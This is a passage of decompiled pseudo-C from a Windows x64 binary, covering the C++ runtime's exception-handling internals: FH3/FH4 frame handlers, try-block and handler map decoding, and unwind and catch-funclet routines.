            || ((v18 = v41, v41 == 0) ? (v19 = 0) : (v19 = v18 + GetImageBase()), *(_BYTE *)(v19 + 16) == 0) )
          {
            if ( (v40[4] & 0x40) == 0 )
            {
              LOBYTE(v29) = 1;
              sub_140012E2C(a1, a2, a3, a4, a5, (struct FH4::HandlerType4 *)v40, 0, (int *)v34, a7, a8, v29, 0);
            }
          }
          v13 = v32;
        }
        v20 = *(_BYTE **)(v13 + 8);
        v21 = *v20 & 0xF;
        v22 = byte_14008FFB0[v21];
        v23 = *(_DWORD *)&v20[-v22 - 4] >> byte_14008FFB0[v21 + 16];
        *(_QWORD *)(v13 + 8) = &v20[-v22];
        *(_DWORD *)(v13 + 24) = v23;
        v24 = v20[-v22] & 0xF;
        v25 = byte_14008FFB0[v24];
        v26 = &v20[-v25 - v22];
        *(_DWORD *)(v13 + 28) = *((_DWORD *)v26 - 1) >> byte_14008FFB0[v24 + 16];
        *(_QWORD *)(v13 + 8) = v26;
        v27 = *v26 & 0xF;
        v28 = &v20[-byte_14008FFB0[v27] - v25 - v22];
        *(_DWORD *)(v13 + 32) = *(v28 - 1) >> byte_14008FFB0[v27 + 16];
        result = (__int64)(v28 + 1);
        *(_QWORD *)(v13 + 8) = v28;
        *(_DWORD *)(v13 + 36) = *v28;
        *(_QWORD *)(v13 + 8) = v28 + 1;
        ++v30;
      }
      while ( v30 < v36 );
    }
  }
  return result;
}


// ----- sub_140013E34 @ 0x140013e34 -----
__int64 __fastcall sub_140013E34(__int64 a1, __int64 a2, _BYTE *a3)
{
  __int64 v3; // rbx
  unsigned int v4; // edi
  __int64 v8; // rbx
  __int64 v9; // rcx
  __int64 v10; // rbp
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbp
  __int64 v14; // rbx
  __int64 v15; // r8
  unsigned __int8 *v16; // rax
  __int64 v17; // r8
  int v18; // edx
  int v19; // ecx

  v3 = *(int *)(a1 + 4);
  v4 = 0;
  if ( (_DWORD)v3 == 0 || v3 + GetImageBase() == 0 )
    return 1;
  v8 = *(int *)(a1 + 4);
  v9 = (_DWORD)v8 != 0 ? v8 + GetImageBase() : 0LL;
  if ( *(_BYTE *)(v9 + 16) == 0 || *(char *)a1 < 0 && (*(_BYTE *)a2 & 0x10) != 0 )
    return 1;
  v10 = *(int *)(a1 + 4);
  if ( (_DWORD)v10 != 0 )
    v11 = GetImageBase() + v10;
  else
    v11 = 0;
  if ( v11 != GetThrowImageBase() + *(int *)(a2 + 4) )
  {
    v12 = *(int *)(a1 + 4);
    v13 = (_DWORD)v12 != 0 ? v12 + GetImageBase() : 0LL;
    v14 = *(int *)(a2 + 4);
    v15 = GetThrowImageBase() + v14 + 16;
    v16 = (unsigned __int8 *)(v13 + 16);
    v17 = v15 - (v13 + 16);
    do
    {
      v18 = v16[v17];
      v19 = *v16 - v18;
      if ( v19 != 0 )
        break;
      ++v16;
    }
    while ( v18 != 0 );
    if ( v19 != 0 )
      return 0;
  }
  if ( ((*(_BYTE *)a2 & 2) == 0 || (*(_BYTE *)a1 & 8) != 0)
    && ((*a3 & 1) == 0 || (*(_BYTE *)a1 & 1) != 0)
    && ((*a3 & 4) == 0 || (*(_BYTE *)a1 & 4) != 0)
    && ((*a3 & 2) == 0 || (*(_BYTE *)a1 & 2) != 0) )
  {
    return 1;
  }
  return v4;
}


// ----- sub_140013F64 @ 0x140013f64 -----
__int64 __fastcall sub_140013F64(__int64 a1, __int64 a2, _BYTE *a3)
{
  __int64 v3; // rbx
  unsigned int v4; // edi
  __int64 v8; // rbx
  __int64 v9; // rcx
  __int64 v10; // rbp
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbp
  __int64 v14; // rbx
  __int64 v15; // r8
  unsigned __int8 *v16; // rax
  __int64 v17; // r8
  int v18; // edx
  int v19; // ecx

  v3 = *(int *)(a1 + 8);
  v4 = 0;
  if ( (_DWORD)v3 == 0 || v3 + GetImageBase() == 0 )
    return 1;
  v8 = *(int *)(a1 + 8);
  v9 = (_DWORD)v8 != 0 ? v8 + GetImageBase() : 0LL;
  if ( *(_BYTE *)(v9 + 16) == 0 || *(char *)(a1 + 4) < 0 && (*(_BYTE *)a2 & 0x10) != 0 )
    return 1;
  v10 = *(int *)(a1 + 8);
  if ( (_DWORD)v10 != 0 )
    v11 = GetImageBase() + v10;
  else
    v11 = 0;
  if ( v11 != GetThrowImageBase() + *(int *)(a2 + 4) )
  {
    v12 = *(int *)(a1 + 8);
    v13 = (_DWORD)v12 != 0 ? v12 + GetImageBase() : 0LL;
    v14 = *(int *)(a2 + 4);
    v15 = GetThrowImageBase() + v14 + 16;
    v16 = (unsigned __int8 *)(v13 + 16);
    v17 = v15 - (v13 + 16);
    do
    {
      v18 = v16[v17];
      v19 = *v16 - v18;
      if ( v19 != 0 )
        break;
      ++v16;
    }
    while ( v18 != 0 );
    if ( v19 != 0 )
      return 0;
  }
  if ( ((*(_BYTE *)a2 & 2) == 0 || (*(_BYTE *)(a1 + 4) & 8) != 0)
    && ((*a3 & 1) == 0 || (*(_BYTE *)(a1 + 4) & 1) != 0)
    && ((*a3 & 4) == 0 || (*(_BYTE *)(a1 + 4) & 4) != 0)
    && ((*a3 & 2) == 0 || (*(_BYTE *)(a1 + 4) & 2) != 0) )
  {
    return 1;
  }
  return v4;
}


// ----- sub_14001409C @ 0x14001409c -----
__int64 __fastcall sub_14001409C(
        struct EHExceptionRecord *a1,
        unsigned __int64 *a2,
        struct _CONTEXT *a3,
        struct _xDISPATCHER_CONTEXT *a4,
        struct _s_FuncInfo *a5,
        int a6,
        __int64 a7,
        unsigned __int8 a8)
{
  bool v12; // zf
  __ehstate_t v13; // eax
  unsigned __int64 *pExceptionObject; // rcx
  __ehstate_t pThrowImageBase; // r9d
  __int64 dispESTypeList; // rbp
  __int64 pForwardCompat; // rbp
  __int64 (__fastcall *v18)(struct EHExceptionRecord *, unsigned __int64 *, struct _CONTEXT *, struct _xDISPATCHER_CONTEXT *, struct _s_FuncInfo *, int, __int64, _DWORD); // rax

  _except_validate_context_record(a3);
  if ( *(_DWORD *)(sub_14001244C() + 64) == 0 && a1->ExceptionCode != -529697949 )
  {
    if ( a1->ExceptionCode != -2147483607 )
    {
      v12 = a1->ExceptionCode == -2147483610;
LABEL_7:
      if ( v12 )
        goto LABEL_10;
      goto LABEL_8;
    }
    if ( a1->NumberParameters == 15 )
    {
      v12 = *(_QWORD *)&a1[1].params.magicNumber == 429065504;
      goto LABEL_7;
    }
LABEL_8:
    if ( (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930522 && (a5->EHFlags & 1) != 0 )
      return 1;
  }
LABEL_10:
  if ( (a1->ExceptionFlags & 0x66) != 0 )
  {
    if ( a5->maxState == 0 || a6 != 0 )
      return 1;
    if ( (a1->ExceptionFlags & 0x20) != 0 )
    {
      if ( a1->ExceptionCode == -2147483610 )
      {
        v13 = sub_140012698((__int64)a5, (__int64)a4, a4->TargetIp);
        if ( v13 >= -1 && v13 < a5->maxState )
        {
          pExceptionObject = a2;
LABEL_18:
          sub_140014E28(pExceptionObject, a4, a5);
          return 1;
        }
        goto LABEL_38;
      }
      if ( a1->ExceptionCode == -2147483607 )
      {
        pThrowImageBase = (__ehstate_t)a1->params.pThrowImageBase;
        if ( pThrowImageBase >= -1 && pThrowImageBase < a5->maxState )
        {
          pExceptionObject = (unsigned __int64 *)a1->params.pExceptionObject;
          goto LABEL_18;
        }
LABEL_38:
        abort();
      }
    }
    __FrameHandler3::FrameUnwindToEmptyState(a2, a4, a5);
    return 1;
  }
  if ( a5->nTryBlocks != 0
    || (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930521
    && (_DWORD)(dispESTypeList = a5->dispESTypeList) != 0
    && dispESTypeList + GetImageBase() != 0
    || (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930522 && (a5->EHFlags & 4) != 0 )
  {
    if ( a1->ExceptionCode == -529697949 && a1->NumberParameters >= 3 && a1->params.magicNumber > 0x19930522 )
    {
      pForwardCompat = a1->params.pThrowInfo->pForwardCompat;
      if ( (_DWORD)pForwardCompat != 0 )
      {
        v18 = (__int64 (__fastcall *)(struct EHExceptionRecord *, unsigned __int64 *, struct _CONTEXT *, struct _xDISPATCHER_CONTEXT *, struct _s_FuncInfo *, int, __int64, _DWORD))(pForwardCompat + GetThrowImageBase());
        if ( v18 != nullptr )
          return v18(a1, a2, a3, a4, a5, a6, a7, a8);
      }
    }
    sub_140012F04(a1, a2, a3, a4, a5, a8, a6, a7);
  }
  return 1;
}


// ----- sub_1400142C4 @ 0x1400142c4 -----
__int64 __fastcall sub_1400142C4(
        struct EHExceptionRecord *a1,
        unsigned __int64 *a2,
        struct _CONTEXT *a3,
        struct _xDISPATCHER_CONTEXT *a4,
        struct FH4::FuncInfo4 *a5,
        int a6,
        __int64 a7,
        unsigned __int8 a8)
{
  int v12; // esi
  _BYTE *v13; // rdx
  int v14; // eax
  __int64 pThrowImageBase_low; // r9
  _BYTE *v16; // r8
  unsigned __int64 *pExceptionObject; // rcx
  _BYTE *v18; // rdx
  __int64 pForwardCompat; // r14
  __int64 (__fastcall *v20)(struct EHExceptionRecord *, unsigned __int64 *, struct _CONTEXT *, struct _xDISPATCHER_CONTEXT *, struct FH4::FuncInfo4 *, int, __int64, _DWORD); // rax
  _DWORD v22[12]; // [rsp+50h] [rbp-48h] BYREF

  _except_validate_context_record(a3);
  v12 = 0;
  if ( *(_DWORD *)(sub_14001244C() + 64) == 0 && a1->ExceptionCode != -529697949 )
  {
    if ( a1->ExceptionCode != -2147483607 )
      goto LABEL_6;
    if ( a1->NumberParameters != 15 )
      goto LABEL_7;
    if ( *(_QWORD *)&a1[1].params.magicNumber != 429065504 )
    {
LABEL_6:
      if ( a1->ExceptionCode != -2147483610 )
      {
LABEL_7:
        if ( (*(_BYTE *)a5 & 0x20) != 0 )
          return 1;
      }
    }
  }
  if ( (a1->ExceptionFlags & 0x66) != 0 )
  {
    if ( *((_DWORD *)a5 + 2) == 0 )
      return 1;
    v13 = (_BYTE *)(*((int *)a5 + 2) + a4->ImageBase);
    if ( *(_DWORD *)&v13[-byte_14008FFB0[*v13 & 0xF] - 4] >> byte_14008FFB0[(*v13 & 0xF) + 16] == 0 || a6 != 0 )
      return 1;
    if ( (a1->ExceptionFlags & 0x20) != 0 )
    {
      if ( a1->ExceptionCode == -2147483610 )
      {
        v14 = sub_1400126F4((__int64)a5, (__int64)a4, a4->TargetIp);
        pThrowImageBase_low = (unsigned int)v14;
        if ( v14 >= -1 )
        {
          if ( *((_DWORD *)a5 + 2) != 0 )
          {
            v16 = (_BYTE *)(*((int *)a5 + 2) + a4->ImageBase);
            v12 = *(_DWORD *)&v16[-byte_14008FFB0[*v16 & 0xF] - 4] >> byte_14008FFB0[(*v16 & 0xF) + 16];
          }
          if ( v14 < v12 )
          {
            pExceptionObject = a2;
LABEL_19:
            sub_140014FC4(pExceptionObject, a4, a5, pThrowImageBase_low);
            return 1;
          }
        }
        goto LABEL_35;
      }
      if ( a1->ExceptionCode == -2147483607 )
      {
        pThrowImageBase_low = LODWORD(a1->params.pThrowImageBase);
        if ( (int)pThrowImageBase_low >= -1 )
        {
          v18 = (_BYTE *)(*((int *)a5 + 2) + a4->ImageBase);
          if ( (int)pThrowImageBase_low < *(_DWORD *)&v18[-byte_14008FFB0[*v18 & 0xF] - 4] >> byte_14008FFB0[(*v18 & 0xF) + 16] )
          {
            pExceptionObject = (unsigned __int64 *)a1->params.pExceptionObject;
            goto LABEL_19;
          }
        }
LABEL_35:
        abort();
      }
    }
    __FrameHandler4::FrameUnwindToEmptyState(a2, a4, a5);
    return 1;
  }
  FH4::TryBlockMap4::TryBlockMap4((FH4::TryBlockMap4 *)v22, a5, a4->ImageBase);
  if ( v22[0] != 0 || (*(_BYTE *)a5 & 0x40) != 0 )
  {
    if ( a1->ExceptionCode == -529697949 && a1->NumberParameters >= 3 && a1->params.magicNumber > 0x19930522 )
    {
      pForwardCompat = a1->params.pThrowInfo->pForwardCompat;
      if ( (_DWORD)pForwardCompat != 0 )
      {
        v20 = (__int64 (__fastcall *)(struct EHExceptionRecord *, unsigned __int64 *, struct _CONTEXT *, struct _xDISPATCHER_CONTEXT *, struct FH4::FuncInfo4 *, int, __int64, _DWORD))(pForwardCompat + GetThrowImageBase());
        if ( v20 != nullptr )
          return v20(a1, a2, a3, a4, a5, a6, a7, a8);
      }
    }
    sub_1400133C4(a1, a2, a3, (__int64)a4, a5, a8, a6, a7);
  }
  return 1;
}


// ----- sub_140014564 @ 0x140014564 -----
// attributes: thunk
__int64 __fastcall sub_140014564(
        struct EHExceptionRecord *a1,
        unsigned __int64 *a2,
        struct _CONTEXT *a3,
        struct _xDISPATCHER_CONTEXT *a4,
        struct _s_FuncInfo *a5,
        int a6,
        __int64 a7,
        unsigned __int8 a8)
{
  return sub_14001409C(a1, a2, a3, a4, a5, a6, a7, a8);
}


// ----- ??$__InternalCxxFrameHandlerWrapper@V__FrameHandler4@@@@YA?AW4_EXCEPTION_DISPOSITION@@PEAUEHExceptionRecord@@PEA_KPEAU_CONTEXT@@PEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@H1E@Z @ 0x14001456c -----
__int64 __fastcall __InternalCxxFrameHandlerWrapper<__FrameHandler4>(
        struct EHExceptionRecord *a1,
        unsigned __int64 *a2,
        struct _CONTEXT *a3,
        struct _xDISPATCHER_CONTEXT *a4,
        struct FH4::FuncInfo4 *a5,
        int a6,
        __int64 a7,
        char a8)
{
  unsigned int v8; // ebx

  v8 = sub_1400142C4(a1, a2, a3, a4, a5, a6, a7, a8);
  *(_DWORD *)(sub_14001244C() + 120) = -2;
  return v8;
}


// ----- ??0HandlerMap4@FH4@@QEAA@PEBUTryBlockMapEntry4@1@_KH@Z @ 0x1400145b8 -----
FH4::HandlerMap4 *__fastcall FH4::HandlerMap4::HandlerMap4(
        FH4::HandlerMap4 *this,
        const struct FH4::TryBlockMapEntry4 *a2,
        __int64 a3,
        int a4)
{
  _BYTE *v5; // rdx
  __int64 v6; // rcx
  _BYTE *v7; // rdx

  *((_QWORD *)this + 1) = 0;
  *((_QWORD *)this + 2) = 0;
  *((_BYTE *)this + 24) = 0;
  *(_QWORD *)((char *)this + 28) = 0;
  *(_QWORD *)((char *)this + 36) = 0;
  *((_OWORD *)this + 3) = 0;
  *((_QWORD *)this + 8) = a3;
  *((_DWORD *)this + 18) = a4;
  if ( *((_DWORD *)a2 + 3) != 0 )
  {
    v5 = (_BYTE *)(a3 + *((int *)a2 + 3));
    *((_QWORD *)this + 1) = v5;
    v6 = *v5 & 0xF;
    v7 = &v5[-byte_14008FFB0[v6]];
    *(_DWORD *)this = *((_DWORD *)v7 - 1) >> byte_14008FFB0[v6 + 16];
    *((_QWORD *)this + 1) = v7;
    *((_QWORD *)this + 2) = v7;
    FH4::HandlerMap4::DecompHandler(this);
  }
  else
  {
    *(_DWORD *)this = 0;
  }
  return this;
}


// ----- ??0TryBlockMap4@FH4@@QEAA@PEBUFuncInfo4@1@_K@Z @ 0x14001463c -----
FH4::TryBlockMap4 *__fastcall FH4::TryBlockMap4::TryBlockMap4(
        FH4::TryBlockMap4 *this,
        const struct FH4::FuncInfo4 *a2,
        __int64 a3)
{
  _BYTE *v4; // rdx
  __int64 v5; // rcx
  _BYTE *v6; // rdx
  int v7; // eax
  __int64 v8; // rcx
  _BYTE *v9; // rdx
  int v10; // eax
  __int64 v11; // rcx
  _BYTE *v12; // rdx
  int v13; // eax
  __int64 v14; // rcx
  _DWORD *v15; // rdx

  *((_QWORD *)this + 1) = 0;
  *((_QWORD *)this + 2) = 0;
  *(_OWORD *)((char *)this + 24) = 0;
  if ( *((_DWORD *)a2 + 3) != 0 )
  {
    v4 = (_BYTE *)(a3 + *((int *)a2 + 3));
    *((_QWORD *)this + 1) = v4;
    v5 = *v4 & 0xF;
    v6 = &v4[-byte_14008FFB0[v5]];
    v7 = *((_DWORD *)v6 - 1) >> byte_14008FFB0[v5 + 16];
    *((_QWORD *)this + 1) = v6;
    *(_DWORD *)this = v7;
    *((_QWORD *)this + 2) = v6;
    v8 = *v6 & 0xF;
    v9 = &v6[-byte_14008FFB0[v8]];
    v10 = *((_DWORD *)v9 - 1) >> byte_14008FFB0[v8 + 16];
    *((_QWORD *)this + 1) = v9;
    *((_DWORD *)this + 6) = v10;
    v11 = *v9 & 0xF;
    v12 = &v9[-byte_14008FFB0[v11]];
    v13 = *((_DWORD *)v12 - 1) >> byte_14008FFB0[v11 + 16];
    *((_QWORD *)this + 1) = v12;
    *((_DWORD *)this + 7) = v13;
    v14 = *v12 & 0xF;
    v15 = &v12[-byte_14008FFB0[v14]];
    *((_DWORD *)this + 8) = *(v15 - 1) >> byte_14008FFB0[v14 + 16];
    *((_QWORD *)this + 1) = v15;
    LODWORD(v14) = *v15;
    *((_QWORD *)this + 1) = v15 + 1;
    *((_DWORD *)this + 9) = v14;
  }
  else
  {
    *(_DWORD *)this = 0;
  }
  return this;
}


// ----- sub_140014720 @ 0x140014720 -----
__int64 __fastcall sub_140014720(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  sub_1400111C8((__int64 *)(a2 + 8), a1 + 8);
  *(_QWORD *)a1 = &std::bad_exception::`vftable';
  return a1;
}


// ----- sub_14001475C @ 0x14001475c -----
_QWORD *__fastcall sub_14001475C(_QWORD *a1)
{
  a1[2] = 0;
  a1[1] = "bad exception";
  *a1 = &std::bad_exception::`vftable';
  return a1;
}


// ----- sub_140014780 @ 0x140014780 -----
__int64 __fastcall sub_140014780(_QWORD *a1)
{
  __int64 v2; // r13
  __int64 v3; // rsi
  __int64 v4; // rbx
  _QWORD *v5; // r14
  __int64 v6; // rax
  _QWORD *FrameInfo; // r12
  __int64 v8; // rbx
  __int64 v10; // [rsp+38h] [rbp-90h]
  __int64 v11; // [rsp+40h] [rbp-88h]
  _QWORD v12[9]; // [rsp+80h] [rbp-48h] BYREF
  __int64 v13; // [rsp+E8h] [rbp+20h]

  v2 = *(_QWORD *)(sub_14001244C() + 40);
  v11 = *(_QWORD *)(sub_14001244C() + 32);
  v3 = a1[10];
  v13 = a1[9];
  v4 = a1[8];
  v10 = a1[6];
  v5 = (_QWORD *)a1[5];
  _except_validate_context_record(v4);
  *(_QWORD *)(sub_14001244C() + 32) = v3;
  *(_QWORD *)(sub_14001244C() + 40) = v4;
  v6 = sub_14001244C();
  FrameInfo = CreateFrameInfo(v12, *(_QWORD *)(*(_QWORD *)(v6 + 32) + 40LL));
  if ( a1[11] != 0 )
    sub_14001244C();
  v8 = CallSettingFrame(v10, v5, 256);
  FindAndUnlinkFrame((__int64)FrameInfo);
  if ( *(_DWORD *)v3 == -529697949
    && *(_DWORD *)(v3 + 24) == 4
    && (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) <= 2
    && (unsigned int)IsExceptionObjectToBeDestroyed(*(_QWORD *)(v3 + 40)) != 0 )
  {
    _DestructExceptionObject(v3);
  }
  *(_QWORD *)(sub_14001244C() + 32) = v11;
  *(_QWORD *)(sub_14001244C() + 40) = v2;
  *(_QWORD *)(*(int *)(v13 + 28) + *v5) = -2;
  return v8;
}


// ----- sub_14001498C @ 0x14001498c -----
__int64 __fastcall sub_14001498C(__int64 a1)
{
  __int64 v2; // r13
  __int64 v3; // rsi
  __int64 v4; // rbx
  __int64 v5; // r14
  __int64 v6; // rax
  _QWORD *FrameInfo; // r12
  __int64 v8; // rax
  __int64 v9; // rbx
  __int64 v11; // [rsp+50h] [rbp-98h]
  __int64 v12; // [rsp+58h] [rbp-90h]
  _QWORD v13[2]; // [rsp+88h] [rbp-60h]
  __int64 v14[10]; // [rsp+98h] [rbp-50h] BYREF
  int v15; // [rsp+100h] [rbp+18h]

  v2 = *(_QWORD *)(sub_14001244C() + 40);
  v12 = *(_QWORD *)(sub_14001244C() + 32);
  v3 = *(_QWORD *)(a1 + 80);
  v4 = *(_QWORD *)(a1 + 64);
  v11 = *(_QWORD *)(a1 + 48);
  v5 = *(_QWORD *)(a1 + 40);
  v13[0] = *(_QWORD *)(a1 + 72);
  v13[1] = *(_QWORD *)(a1 + 104);
  v15 = *(_DWORD *)(a1 + 56);
  _except_validate_context_record(v4);
  *(_QWORD *)(sub_14001244C() + 32) = v3;
  *(_QWORD *)(sub_14001244C() + 40) = v4;
  v6 = sub_14001244C();
  FrameInfo = CreateFrameInfo(v14, *(_QWORD *)(*(_QWORD *)(v6 + 32) + 40LL));
  if ( *(_QWORD *)(a1 + 88) != 0 )
    sub_14001244C();
  v8 = CallSettingFrame_LookupContinuationIndex(v11, v5, 256);
  v9 = v8;
  if ( v8 < 2 )
  {
    v9 = v13[v8];
    if ( v9 == 0 )
      abort();
  }
  CallSettingFrame_NotifyContinuationAddr(v9, v5);
  FindAndUnlinkFrame((__int64)FrameInfo);
  if ( *(_DWORD *)v3 == -529697949
    && *(_DWORD *)(v3 + 24) == 4
    && (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) <= 2
    && (unsigned int)IsExceptionObjectToBeDestroyed(*(_QWORD *)(v3 + 40)) != 0 )
  {
    _DestructExceptionObject(v3);
  }
  *(_QWORD *)(sub_14001244C() + 32) = v12;
  *(_QWORD *)(sub_14001244C() + 40) = v2;
  *(_DWORD *)(sub_14001244C() + 120) = v15;
  *(_DWORD *)(sub_14001244C() + 120) = -2;
  return v9;
}


// ----- ?DecompHandler@HandlerMap4@FH4@@AEAAXXZ @ 0x140014be8 -----
void __fastcall FH4::HandlerMap4::DecompHandler(FH4::HandlerMap4 *this)
{
  char *v2; // rax
  char v3; // r10
  _BYTE *v4; // rdx
  __int64 v5; // rcx
  int v6; // eax
  __int64 v7; // rcx
  int *v8; // r9
  char v9; // al
  __int64 v10; // rcx
  __int64 v11; // rax
  __int64 v12; // rcx
  __int64 v13; // rcx
  char *v14; // r9
  __int64 v15; // rax
  int v16; // edx
  __int64 v17; // rcx
  _BYTE *v18; // r9
  int v19; // eax
  __int64 v20; // rcx
  _BYTE *v21; // r9
  int v22; // eax

  *((_BYTE *)this + 24) = 0;
  *(_QWORD *)((char *)this + 28) = 0;
  *(_QWORD *)((char *)this + 36) = 0;
  *((_OWORD *)this + 3) = 0;
  v2 = *((char **)this + 1);
  v3 = *v2;
  v4 = v2 + 1;
  *((_BYTE *)this + 24) = *v2;
  *((_QWORD *)this + 1) = v2 + 1;
  if ( (v3 & 1) != 0 )
  {
    v5 = *v4 & 0xF;
    v4 -= byte_14008FFB0[v5];
    *((_DWORD *)this + 7) = *((_DWORD *)v4 - 1) >> byte_14008FFB0[v5 + 16];
    *((_QWORD *)this + 1) = v4;
  }
  if ( (v3 & 2) != 0 )
  {
    v6 = *(_DWORD *)v4;
    v4 += 4;
    *((_QWORD *)this + 1) = v4;
    *((_DWORD *)this + 8) = v6;
  }
  if ( (v3 & 4) != 0 )
  {
    v7 = *v4 & 0xF;
    v4 -= byte_14008FFB0[v7];
    *((_DWORD *)this + 9) = *((_DWORD *)v4 - 1) >> byte_14008FFB0[v7 + 16];
    *((_QWORD *)this + 1) = v4;
  }
  v8 = (int *)(v4 + 4);
  *((_DWORD *)this + 10) = *(_DWORD *)v4;
  v9 = v3 & 0x30;
  *((_QWORD *)this + 1) = v4 + 4;
  if ( (v3 & 8) != 0 )
  {
    if ( v9 == 16 )
    {
      v10 = *v8;
      *((_QWORD *)this + 1) = v4 + 8;
      *((_QWORD *)this + 6) = v10;
      return;
    }
    if ( v9 == 32 )
    {
      v11 = *v8;
      *((_QWORD *)this + 1) = v4 + 8;
      *((_QWORD *)this + 6) = v11;
      v12 = *((int *)v4 + 2);
      *((_QWORD *)this + 1) = v4 + 12;
LABEL_16:
      *((_QWORD *)this + 7) = v12;
    }
  }
  else
  {
    if ( v9 == 16 )
    {
      v13 = *(_BYTE *)v8 & 0xF;
      v14 = (char *)v8 - byte_14008FFB0[v13];
      v15 = (unsigned int)((*((_DWORD *)v14 - 1) >> byte_14008FFB0[v13 + 16]) + *((_DWORD *)this + 18));
      *((_QWORD *)this + 1) = v14;
      *((_QWORD *)this + 6) = v15;
      return;
    }
    if ( v9 == 32 )
    {
      v16 = *((_DWORD *)this + 18);
      v17 = *(_BYTE *)v8 & 0xF;
      v18 = (char *)v8 - byte_14008FFB0[v17];
      v19 = *((_DWORD *)v18 - 1) >> byte_14008FFB0[v17 + 16];
      *((_QWORD *)this + 1) = v18;
      *((_QWORD *)this + 6) = (unsigned int)(v16 + v19);
      v20 = *v18 & 0xF;
      v21 = &v18[-byte_14008FFB0[v20]];
      v22 = *((_DWORD *)v21 - 1) >> byte_14008FFB0[v20 + 16];
      *((_QWORD *)this + 1) = v21;
      v12 = (unsigned int)(v16 + v22);
      goto LABEL_16;
    }
  }
}


// ----- sub_140014D70 @ 0x140014d70 -----
__int64 __fastcall sub_140014D70(__int64 *a1, __int64 a2, _DWORD *a3)
{
  __int64 v3; // r9

  v3 = *a1;
  *a3 = 0;
  if ( *(_DWORD *)v3 != -529697949 )
    return 0;
  if ( *(_DWORD *)(v3 + 24) == 4
    && (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) <= 2
    && *(_QWORD *)(v3 + 40) == *(_QWORD *)(a2 + 40) )
  {
    *a3 = 1;
  }
  if ( *(_DWORD *)v3 != -529697949
    || *(_DWORD *)(v3 + 24) != 4
    || (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) > 2
    || *(_QWORD *)(v3 + 48) != 0 )
  {
    return 0;
  }
  *(_DWORD *)(sub_14001244C() + 64) = 1;
  *a3 = 1;
  return 1;
}


// ----- ?ExFilterRethrowFH4@@YAHPEAU_EXCEPTION_POINTERS@@PEAUEHExceptionRecord@@HPEAH@Z @ 0x140014df8 -----
__int64 __fastcall ExFilterRethrowFH4(struct _EXCEPTION_POINTERS *a1, struct EHExceptionRecord *a2, int a3, int *a4)
{
  unsigned int v5; // ebx

  v5 = sub_140014D70((__int64 *)a1, (__int64)a2, a4);
  if ( v5 == 0 )
    *(_DWORD *)(sub_14001244C() + 120) = a3;
  return v5;
}


// ----- sub_140014E28 @ 0x140014e28 -----
void __fastcall sub_140014E28(
        unsigned __int64 *a1,
        struct _xDISPATCHER_CONTEXT *a2,
        struct _s_FuncInfo *a3,
        __ehstate_t a4)
{
  __ehstate_t v8; // edi
  __int64 v9; // rax
  __int64 v10; // r14
  __int64 dispUnwindMap; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx
  __int64 v14; // rax
  __int64 v15; // rbx
  __int64 v16; // rbx
  __int64 v17; // rbx
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 ImageBase; // [rsp+30h] [rbp-48h]

  ImageBase = GetImageBase();
  v8 = sub_1400125EC(a1, a2, (__int64)a3);
  v9 = sub_14001244C();
  ++*(_DWORD *)(v9 + 48);
  while ( v8 != -1 && v8 > a4 )
  {
    if ( v8 <= -1 || v8 >= a3->maxState )
      abort();
    v10 = 8LL * v8;
    v8 = *(_DWORD *)(v10 + a3->dispUnwindMap + GetImageBase());
    dispUnwindMap = a3->dispUnwindMap;
    if ( *(_DWORD *)(v10 + GetImageBase() + dispUnwindMap + 4) != 0 )
    {
      v12 = a3->dispUnwindMap;
      v13 = *(int *)(v10 + GetImageBase() + v12 + 4);
      v14 = v13 + GetImageBase();
    }
    else
    {
      v14 = 0;
    }
    if ( v14 != 0 )
    {
      __SetState(a1, a2, a3, v8);
      v15 = a3->dispUnwindMap;
      if ( *(_DWORD *)(v10 + GetImageBase() + v15 + 4) != 0 )
      {
        v16 = a3->dispUnwindMap;
        v17 = *(int *)(v10 + GetImageBase() + v16 + 4);
        v18 = v17 + GetImageBase();
      }
      else
      {
        v18 = 0;
      }
      CallSettingFrame(v18, a1, 259);
      SetImageBase(ImageBase);
    }
  }
  if ( *(int *)(sub_14001244C() + 48) > 0 )
  {
    v19 = sub_14001244C();
    --*(_DWORD *)(v19 + 48);
  }
  if ( v8 != -1 && v8 > a4 )
    abort();
  __SetState(a1, a2, a3, v8);
}


// ----- sub_140014FC4 @ 0x140014fc4 -----
__int64 __fastcall sub_140014FC4(_QWORD *a1, __int64 a2, __int64 a3, int a4)
{
  __int64 ImageBase; // rdi
  int v9; // esi
  _DWORD *v10; // r15
  __int64 v11; // rax
  FH4::UWMap4 *v12; // rdx
  _BYTE *v13; // rdx
  __int64 v14; // rcx
  FH4::UWMap4 *v15; // r12
  FH4::UWMap4 *v16; // rbx
  int v17; // edi
  int v18; // eax
  int v19; // r9d
  int v20; // ecx
  _QWORD *v21; // r8
  __int64 result; // rax
  FH4::UWMap4 *v24[2]; // [rsp+40h] [rbp-F8h] BYREF
  int v25; // [rsp+50h] [rbp-E8h]
  int v26; // [rsp+54h] [rbp-E4h]
  unsigned int v27; // [rsp+58h] [rbp-E0h]
  int v28; // [rsp+5Ch] [rbp-DCh]
  int v29; // [rsp+60h] [rbp-D8h]
  __int64 v30; // [rsp+68h] [rbp-D0h]
  int *v31; // [rsp+70h] [rbp-C8h] BYREF
  FH4::UWMap4 *v32; // [rsp+78h] [rbp-C0h]
  _QWORD *v33; // [rsp+80h] [rbp-B8h]
  __int64 v34; // [rsp+88h] [rbp-B0h]
  _QWORD *v35; // [rsp+90h] [rbp-A8h]
  __int64 v36; // [rsp+98h] [rbp-A0h]
  __int64 v37; // [rsp+A0h] [rbp-98h]
  int *v38; // [rsp+A8h] [rbp-90h]
  FH4::UWMap4 *v39; // [rsp+B0h] [rbp-88h]
  __int128 v40; // [rsp+C0h] [rbp-78h] BYREF
  int v41; // [rsp+D0h] [rbp-68h] BYREF
  FH4::UWMap4 *v42; // [rsp+D8h] [rbp-60h]
